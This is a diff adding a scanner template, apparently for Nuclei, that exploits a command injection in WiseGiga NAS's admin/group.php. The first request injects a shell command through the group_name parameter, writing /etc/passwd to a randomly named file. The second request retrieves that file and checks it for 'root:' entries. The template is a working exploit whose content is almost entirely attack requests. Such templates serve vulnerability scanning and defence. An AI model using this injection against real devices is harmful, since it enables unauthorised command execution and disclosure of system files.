@@ -1,0 +1,41 @@
+id: poc-yaml-wisegiga-nas-group-php-command-injection
+info:
+  name: WiseGiga NAS group.php Command Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: command-injection
+http:
+  - raw:
+      - |
+        GET /admin/group.php?memberid=root&cmd=add&group_name=d;cat+/etc/passwd>{{randstr}}.txt HTTP/1.1
+        Host: {{Hostname}}
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: file_name
+        internal: true
+        part: body
+        regex:
+          - "{{randstr}}.txt"
+
+  - raw:
+      - |
+        GET /admin/{{file_name}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "/bin"
+          - "root:"
+        condition: and
+      - type: word
+        words:
+          - "<"
+        negative: true
